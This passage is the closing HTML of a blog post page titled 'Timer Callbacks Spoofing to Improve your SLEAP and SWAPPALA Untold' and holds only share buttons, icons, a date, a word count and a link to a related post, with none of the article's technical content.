24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2832 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2024-09-17 14:50</p></div><hr><div class="sharing-buttons"><a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;caption=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="mailto:?subject=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_self" rel="noopener" aria-label="" title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></div></div></a><a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&amp;media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f;description=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold" target="_blank" rel="noopener" aria-label="" title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&amp;title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;summary=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></div></div></a><a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&amp;resubmit=true&amp;title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold" target="_blank" rel="noopener" aria-label="" title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f;title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold" target="_blank" rel="noopener" aria-label="" title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="whatsapp://send?text=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&amp;t=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold" target="_blank" rel="noopener" aria-label="" title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></div></div></a></div><div class="pagination"><div class="pagination__buttons"><span class="button next"><a href="https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/"><span class="button__text">SLE(A)PING Issues: SWAPPALA and Reflective DLL Friends Forever</span>
<span class="button__icon">‚Üí</span></a></span></div></div></main></div></div></body></html>